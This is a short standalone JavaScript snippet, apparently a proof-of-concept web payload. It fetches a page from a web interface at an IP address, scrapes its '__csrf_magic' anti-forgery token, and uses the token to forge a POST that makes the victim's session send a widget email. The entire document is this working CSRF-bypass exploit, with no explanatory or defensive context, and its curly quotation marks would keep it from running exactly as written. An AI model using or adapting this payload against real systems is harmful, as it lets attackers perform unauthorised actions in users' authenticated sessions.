function readBody(xhr) {
 var data;
 if (!xhr.responseType || xhr.responseType === “text”) {
 data = xhr.responseText;
 } else if (xhr.responseType === “document”) {
 data = xhr.responseXML;
 } else {
 data = xhr.response;
 }
 var parser = new DOMParser();
 var resp = parser.parseFromString(data, “text/html”);
 token = resp.getElementsByName(‘__csrf_magic’)[0].value; //grab first available token
csrf(token);
 return data;
}
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function () {
 if (xhr.readyState == 4) {
 response = readBody(xhr);
 }
}
xhr.open(‘GET’, ‘https://72.1.207.178/index.php’, true);
xhr.send(null);
function csrf(token) {
 var sendWidgetModel = {
 “toEmail”: ‘john.doe@example.com’,
 “widgetMessage”: “Goodbye, John. We are not friends.”,
 };
 var x1 = new XMLHttpRequest();
 x1.open(“POST”, “https://72.1.207.178/index.php");
 x1.setRequestHeader(“Content-Type”, “application/json; charset=utf-8”);
 x1.setRequestHeader(‘__csrf_magic’, token);
 x1.send(JSON.stringify(sendWidgetModel));
}